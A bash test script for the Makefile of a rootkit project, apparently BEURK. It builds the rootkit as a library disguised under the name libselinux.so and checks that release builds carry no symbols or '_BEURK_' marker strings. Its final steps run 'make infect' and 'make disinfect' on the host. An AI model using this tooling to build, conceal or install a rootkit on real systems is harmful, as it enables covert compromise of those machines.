#!/usr/bin/env bash

# test: makefile.sh
#
# Ensure that Makefile works as expected in
# some scenarios for building the rootkit

if [ `uname -s` = "FreeBSD" ]; then
    MAKE=gmake
else
    MAKE=make
fi

DSO=libselinux.so

set -ve
cd `git rev-parse --show-toplevel`


#### start with a clean repository
$MAKE distclean


#### ensure that an invalid rule fails
! $MAKE foobar


#### run make multiple times, check for `nothing to do`
$MAKE distclean
$MAKE
$MAKE all
test `$MAKE all | grep -i nothing | wc -l` -eq "1"


#### test make re
$MAKE re
test -d obj/
test -f "$DSO" -a -x "$DSO"
nm --debug-syms "$DSO" 2>&1 | grep -iq 'no symbols'
! strings "$DSO" | grep -q "_BEURK_"


#### test make re with debug mode
BEURK_DEBUG_LEVEL=1 $MAKE re
test -d obj/
test -f "$DSO" -a -x "$DSO"
! nm --debug-syms "$DSO" 2>&1 | grep -iq 'no symbols'
strings "$DSO" | grep -q "_BEURK_"


#### test make clean
$MAKE
$MAKE clean
test -f "$DSO" -a -x "$DSO"
! test -e obj/
test -e src/config.c
test -e includes/config.h


#### test make distclean
$MAKE
$MAKE distclean
! test -e "$DSO"
! test -e obj/
! test -e src/config.c
! test -e includes/config.h


#### test make infect
$MAKE distclean
BEURK_DEBUG_LEVEL=1 $MAKE infect


#### test make disinfect
$MAKE distclean
BEURK_DEBUG_LEVEL=1 $MAKE disinfect
